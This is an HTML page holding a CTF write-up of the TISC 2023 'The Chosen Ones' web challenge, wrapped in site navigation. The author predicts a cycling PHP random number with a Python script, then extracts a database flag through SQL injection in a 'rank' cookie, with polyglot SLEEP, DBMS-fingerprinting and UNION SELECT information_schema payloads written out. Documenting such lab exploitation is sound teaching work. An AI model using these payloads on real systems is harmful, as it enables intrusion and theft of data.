<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>TISC 2023 - The Chosen Ones</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-9b741782.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-ce236130.css">
  <meta property="article:tag" content="TISC 2023"><meta property="article:tag" content="web"><meta name="description" content="Overall, I feel this challenge was comparitively straightforward and provided some respite from the previous challenges.

We are asked to guess a number on the landing page, and the number seems to be randomly generated each time:

![number guessing page](/ctf-writeups/tisc23/the-chosen-ones-first.png)

Initially, I assumed the php `rand()` function was being used, and spent sometime researching on methods to predict the next random value based on previous outputs. This was largely unsuccessful. However, I eventually realised the source code for generating the 6 digit number was provided in a base32 encoded comment in the html.

```php
function random() {
  $prev = $_SESSION[&quot;seed&quot;];
  $current = (int)$prev ^ 844742906;
  $current = decbin($current);
  while (strlen($current) < 32) {
    $current = &quot;0&quot; . $current;
  }
  $first = substr($current, 0, 7);
  $second = substr($current, 7, 25);
  $current = $second . $first;
  $current = bindec($current);
  $_SESSION[&quot;seed&quot;] = $current;
  return $current % 1000000;
}
```

After studying this function for a while, I realised it produces a sequence that eventually repeats after being run a certain number of times due to the way the string is being rotated and xored. I wrote some code to check this:

```php
$a = random();
for ($i = 1; ; $i++) {
  if (random() == $a) {
    echo $i . &quot;\n&quot;;
    break;
  }
}
```

This printed 64. So the first number will be the same as the 65th number produced. I wrote a python script:

```python:s.py
import requests
import re

sess = requests.Session()

sess.get('http://chals.tisc23.ctf.sg:51943/index.php')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')
a = int(re.search('The lucky number was (\d+?)<BR>', resp.text).group(1))

for _ in range(63):
    sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=' + str(a))
print(resp.text)

print(sess.cookies.get_dict())

sess.close()
```

```plaintext
<center>
Personnel List <br>
<iframe src=&quot;table.php&quot; title=&quot;personnel&quot; width=&quot;750&quot; height=&quot;1500&quot; frameBorder=&quot;0&quot;>
</center>

{'PHPSESSID': 'srav744br8cui13r6dgb15j2cv', 'rank': '0'}
```

I copied the `PHPSESSID` and `rank` cookies into Chrome, and viewed `/table.php`.

![table](/ctf-writeups/tisc23/the-chosen-ones-table.png)

I tried some standard sql injection payloads such as `' or 1=1;--`, however they didn't seem to work. I then tried a polyglot injection payload I found on PayloadAllTheThings:

```sql
SLEEP(1) /*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/
```

This yielded no results on both the username and password fields.

Then I remembered the strange `rank` cookie and tried to figure out what it did. I changed the value to 1, and this time the table was larger:

![table](/ctf-writeups/tisc23/the-chosen-ones-table-2.png)

Changing the value to 2, I could see more rows with users of rank 2 as well. So rank is probably included in the sql query as well and a possible vector for sql injection. I set rank to the polyglot injection payload above and sent another request. This time, the request returned a server error after a while, so the sql injection was successful.

Next, I had to identify the type of database. Referring to this [list of payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification), I sent `rank=1 and conv('a',16,2)=conv('a',16,2);--` and it succeeded, showing that the underlying database is MySQL.

Next, we have to extract information about the db schema. Following [this section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema), I sent a request with `rank=-1 union select schema_name, 1, 1, 1 from information_schema.schemata;--`

There are 3 schemas, `information_schema`, `palindrome`, and `performance_schema`. palindrome seems to be what we want, so I listed the tables there with `rank=-1 union select table_name, 1, 1, 1 from information_schema.tables where table_schema = &quot;palindrome&quot;;--`.

There were 2 tables, `CTF_SECRET` and `PERSONNEL`. I listed the columns in the `CTF_SECRET` table using `rank=-1 union select column_name, 1, 1, 1 from information_schema.columns where table_name = &quot;CTF_SECRET&quot;;--`. There was only one column: `flag`.

I sent my final request with `rank=-1 union select flag, 1, 1, 1 from palindrome.CTF_SECRET;--`, and got the flag: `TISC{Y0u_4rE_7h3_CH0s3n_0nE}`."><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a href="/ctf-writeups/ctfinder" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">CTFinder</span></a><a href="/ctf-writeups/jnotes" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a aria-current="page" href="/ctf-writeups/the-chosen-ones" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-5"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a href="/ctf-writeups/ctfinder" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">CTFinder</span></a><a href="/ctf-writeups/jnotes" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] 